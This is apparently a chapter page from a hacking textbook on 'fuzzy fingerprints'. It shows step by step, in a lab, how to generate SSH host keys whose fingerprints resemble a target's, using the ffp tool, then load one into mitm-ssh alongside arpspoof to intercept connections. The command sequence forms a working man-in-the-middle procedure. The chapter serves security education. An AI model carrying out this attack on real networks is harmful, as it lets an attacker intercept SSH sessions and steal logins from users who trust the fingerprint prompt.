<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x753 Fuzzy Fingerprints</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part180.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part182.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark166">0x753 Fuzzy Fingerprints</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Konrad Rieck had an interesting idea regarding SSH host fingerprints. Often, a user will connect to a server from several different clients. The host finger- print will be displayed and added each time a new client is used, and a security- conscious user will tend to remember the general structure of the host fingerprint. While no one actually memorizes the entire fingerprint, major changes can be detected with little effort. Having a general idea of what the host fingerprint looks like when connecting from a new client greatly increases the security of that connection. If an MitM attack is attempted, the blatant difference in host fingerprints can usually be detected by eye.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">However, the eye and the brain can be tricked. Certain fingerprints will look very similar to others. Digits 1 and 7 look very similar, depending on the display font. Usually, the hex digits found at the beginning and end of the fingerprint are remembered with the greatest clarity, while the middle tends</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">to be a bit hazy. The goal behind the fuzzy fingerprint technique is to generate a host key with a fingerprint that looks similar enough to the original finger- print to fool the human eye.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">The openssh package provides tools to retrieve the host key from servers.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1249.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ ssh-keyscan -t rsa 192.168.42.72 &gt; loki.hostkey # 192.168.42.72 SSH-1.99-OpenSSH_3.9p1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ cat loki.hostkey 192.168.42.72 ssh-rsa</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">AAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">JSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/ 52KTzjtKGacX4gTLNSc8fzfZU=</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $ ssh-keygen -l -f loki.hostkey</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1250.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now that the host key fingerprint format is known for 192.168.42.72 (loki), fuzzy fingerprints can be generated that look similar. A program that does this has been developed by Rieck and is available at http://www.thc</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">.org/thc-ffp/. The following output shows the creation of some fuzzy finger- prints for 192.168.42.72 (loki).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1251.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~ $ ffp Usage: ffp [Options] Options:</p><p class="s31" style="padding-left: 87pt;text-indent: -59pt;line-height: 107%;text-align: left;">-f type   Specify type of fingerprint to use [Default: md5] Available: md5, sha1, ripemd</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-t hash   Target fingerprint in byte blocks.</p><p class="s31" style="padding-left: 87pt;text-indent: 0pt;text-align: left;">Colon-separated: 01:23:45:67... or as string 01234567...</p><p class="s31" style="padding-left: 87pt;text-indent: -59pt;line-height: 107%;text-align: left;">-k type    Specify type of key to calculate [Default: rsa] Available: rsa, dsa</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-b bits    Number of bits in the keys to calculate [Default: 1024]</p><p class="s31" style="padding-left: 87pt;text-indent: -59pt;line-height: 107%;text-align: left;">-K mode    Specify key calulation mode [Default: sloppy] Available: sloppy, accurate</p><p class="s31" style="padding-left: 87pt;text-indent: -59pt;line-height: 107%;text-align: left;">-m type    Specify type of fuzzy map to use [Default: gauss] Available: gauss, cosine</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-v variation Variation to use for fuzzy map generation [Default: 7.3]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-y mean    Mean value to use for fuzzy map generation [Default: 0.14]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-l size   Size of list that contains best fingerprints [Default: 10]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-s filename  Filename of the state file [Default: /var/tmp/ffp.state]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-e      Extract SSH host key pairs from state file</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-d directory Directory to store generated ssh keys to [Default: /tmp]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-p period   Period to save state file and display state [Default: 60]</p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">-V      Display version information</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">No state file /var/tmp/ffp.state present, specify a target hash.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1252.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="358" height="1" alt="image" src="Image_1253.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">reader@hacking:~ $ ffp -f md5 -k rsa -b 1024 -t ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 [Initializing]</p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;line-height: 106%;text-align: right;">Initializing Crunch Hash: Done Initializing Fuzzy Map: Done Initializing Private Key: Done Initializing Hash List: Done Initializing FFP State: Done</p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1254.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="374" height="1" alt="image" src="Image_1255.png"/></span></p><p class="s31" style="padding-top: 2pt;padding-left: 36pt;text-indent: -4pt;text-align: left;">[Fuzzy Map] Length: 32</p><p class="s31" style="padding-left: 49pt;text-indent: -4pt;line-height: 107%;text-align: justify;">Type: Inverse Gaussian Distribution Sum: 15020328</p><p class="s31" style="text-indent: 0pt;text-align: right;">Fuzzy Map: 10.83% | 9.64% : 8.52% | 7.47% : 6.49% | 5.58% : 4.74% | 3.96% :</p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;text-align: right;">3.25% | 2.62% : 2.05% | 1.55% : 1.12% | 0.76% : 0.47% | 0.24% :</p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;text-align: right;">0.09% | 0.01% : 0.00% | 0.06% : 0.19% | 0.38% : 0.65% | 0.99% :</p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;text-align: right;">1.39% | 1.87% : 2.41% | 3.03% : 3.71% | 4.46% : 5.29% | 6.18% :</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1256.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="363" height="1" alt="image" src="Image_1257.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">[Current Key]</p><p class="s31" style="padding-left: 53pt;text-indent: 29pt;line-height: 107%;text-align: left;">Key Algorithm: RSA (Rivest Shamir Adleman) Key Bits / Size of n: 1024 Bits</p><p class="s31" style="padding-left: 23pt;text-indent: 63pt;text-align: left;">Public key e: 0x10001 Public Key Bits / Size of e: 17 Bits</p><p class="s31" style="padding-left: 74pt;text-indent: -21pt;line-height: 107%;text-align: left;">Phi(n) and e r.prime: Yes Generation Mode: Sloppy</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;line-height: 107%;text-align: left;">State File: /var/tmp/ffp.state Running...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1258.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="352" height="1" alt="image" src="Image_1259.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">[Current State]</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">Running:  0d 00h 00m 00s | Total:     0k hashs | Speed:   nan hashs/s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1260.png"/></span></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: -8pt;text-align: justify;">Best Fuzzy Fingerprint from State File /var/tmp/ffp.state Hash Algorithm: Message Digest 5 (MD5)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: justify;">Digest Size: 16 Bytes / 128 Bits</p><p class="s31" style="padding-left: 36pt;text-indent: -4pt;line-height: 106%;text-align: justify;">Message Digest: 6a:06:f9:a6:cf:09:19:af:c3:9d:c5:b9:91:a4:8d:81 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 Fuzzy Quality: 25.652482%</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1261.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="352" height="1" alt="image" src="Image_1262.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">[Current State]</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">Running:  0d 00h 01m 00s | Total:    7635k hashs | Speed:  127242 hashs/s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1263.png"/></span></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: -8pt;line-height: 107%;text-align: justify;">Best Fuzzy Fingerprint from State File /var/tmp/ffp.state Hash Algorithm: Message Digest 5 (MD5)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">Digest Size: 16 Bytes / 128 Bits</p><p class="s31" style="padding-left: 36pt;text-indent: -4pt;line-height: 107%;text-align: justify;">Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 Fuzzy Quality: 55.471931%</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1264.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="352" height="1" alt="image" src="Image_1265.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">[Current State]</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">Running:  0d 00h 02m 00s | Total:   15370k hashs | Speed:  128082 hashs/s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1266.png"/></span></p><p class="s31" style="padding-top: 3pt;padding-left: 32pt;text-indent: -8pt;line-height: 107%;text-align: justify;">Best Fuzzy Fingerprint from State File /var/tmp/ffp.state Hash Algorithm: Message Digest 5 (MD5)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: justify;">Digest Size: 16 Bytes / 128 Bits</p><p class="s31" style="padding-left: 36pt;text-indent: -4pt;line-height: 106%;text-align: justify;">Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 Fuzzy Quality: 55.471931%</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">.:[ output trimmed ]:.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1267.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="352" height="1" alt="image" src="Image_1268.png"/></span></p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">[Current State]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Running: 1d 05h 06m 00s | Total: 13266446k hashs | Speed: 126637 hashs/s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1269.png"/></span></p><p class="s31" style="padding-top: 4pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Best Fuzzy Fingerprint from State File /var/tmp/ffp.state Hash Algorithm: Message Digest 5 (MD5)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Digest Size: 16 Bytes / 128 Bits</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Message Digest: ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 Fuzzy Quality: 70.158321%</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1270.png"/></span></p><p class="s31" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Exiting and saving state file /var/tmp/ffp.state reader@hacking:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1271.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This fuzzy fingerprint generation process can go on for as long as desired. The program keeps track of some of the best fingerprints and will display them periodically. All of the state information is stored in /var/tmp/ffp.state, so the program can be exited with a <span class="s7">CTRL</span>-C and then resumed again later by simply running <span class="s31">ffp </span>without any arguments.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After running for a while, SSH host key pairs can be extracted from the state file with the <span class="s31">-e </span>switch.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1272.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="17" height="1" alt="image" src="Image_1273.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="374" height="1" alt="image" src="Image_1274.png"/></span></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">reader@hacking:~ $ ffp -e -d /tmp [Restoring]</p><p class="s31" style="padding-left: 23pt;text-indent: 8pt;line-height: 107%;text-align: right;">Reading FFP State File: Done Restoring environment: Done Initializing Crunch Hash: Done</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="451" height="1" alt="image" src="Image_1275.png"/></span></p><p class="s31" style="padding-top: 3pt;padding-left: 23pt;text-indent: 0pt;text-align: left;">Saving SSH host key pairs: [00] [01] [02] [03] [04] [05] [06] [07] [08] [09]</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $ ls /tmp/ssh-rsa*</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:81pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa00</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa02.pub</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa05</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa07.pub</p></td></tr><tr style="height:11pt"><td style="width:81pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa00.pub</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa03</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa05.pub</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa08</p></td></tr><tr style="height:11pt"><td style="width:81pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa01</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa03.pub</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa06</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/tmp/ssh-rsa08.pub</p></td></tr><tr style="height:11pt"><td style="width:81pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa01.pub</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa04</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa06.pub</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa09</p></td></tr><tr style="height:11pt"><td style="width:81pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa02</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa04.pub</p></td><td style="width:85pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa07</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/tmp/ssh-rsa09.pub</p></td></tr><tr style="height:14pt"><td style="width:81pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~ $</p></td><td style="width:85pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:85pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:154pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In the preceding example, 10 public and private host key pairs have been generated. Fingerprints for these key pairs can then be generated and compared with the original fingerprint, as seen in the following output.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1276.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $ for i in $(ls -1 /tmp/ssh-rsa*.pub)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; ssh-keygen -l -f $i</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; done</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 /tmp/ssh-rsa00.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7f:12:bd:8a:5b:5c:eb:dd:93:ec:ec:d3:89:a9 /tmp/ssh-rsa01.pub</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0 /tmp/ssh-rsa02.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:49:d4:b9:d4:96:4b:93:e8:5d:00:bd:99:53:a0 /tmp/ssh-rsa03.pub</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7c:d2:15:a2:d3:0d:bf:f0:d4:5d:c6:10:22:90 /tmp/ssh-rsa04.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:3f:22:1b:44:7b:db:41:27:54:ac:4a:10:29:e0 /tmp/ssh-rsa05.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:78:dc:be:a6:43:15:eb:3f:ac:92:e5:8e:c9:50 /tmp/ssh-rsa06.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7f:da:ae:61:58:aa:eb:55:d0:0c:f6:13:61:30 /tmp/ssh-rsa07.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7d:e8:94:ad:eb:95:d2:c5:1e:6d:19:53:59:a0 /tmp/ssh-rsa08.pub</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">1024 ba:06:74:a2:c2:8b:a4:92:e1:e1:75:f5:19:15:60:a0 /tmp/ssh-rsa09.pub reader@hacking:~ $ ssh-keygen -l -f ./loki.hostkey</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1277.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">From the 10 generated key pairs, the one that seems to look the most similar can be determined by eye. In this case, ssh-rsa02.pub, shown in bold, was chosen. Regardless of which key pair is chosen, though, it will certainly look more like the original fingerprint than any randomly generated key would.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This new key can be used with mitm-ssh to make for an even more effective attack. The location for the host key is specified in the config- uration file, so using the new key is simply matter of adding a <span class="s31">HostKey </span>line in /usr/local/etc/mitm-ssh_config, as shown below. Since we need to remove the <span class="s31">Protocol 1 </span>line we added earlier, the output below simply overwrites the configuration file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1278.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~ $ echo &quot;HostKey /tmp/ssh-rsa02&quot; &gt; /usr/local/etc/mitm-ssh_config reader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222Using static route to 192.168.42.72:22 Disabling protocol version 1. Could not load host key</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">SSH MITM Server listening on 0.0.0.0 port 2222.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1279.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">In another terminal window, arpspoof is running to redirect the traffic to mitm-ssh, which will use the new host key with the fuzzy fingerprint. The output below compares the output a client would see when connecting.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Normal Connection</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1280.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Are you sure you want to continue connecting (yes/no)?</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1281.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">MitM-Attacked Connection</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1282.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Are you sure you want to continue connecting (yes/no)?</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1283.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Can you immediately tell the difference? These fingerprints look similar enough to trick most people into simply accepting the connection.</p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part182.htm">0x760 Password Cracking</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part180.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part182.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
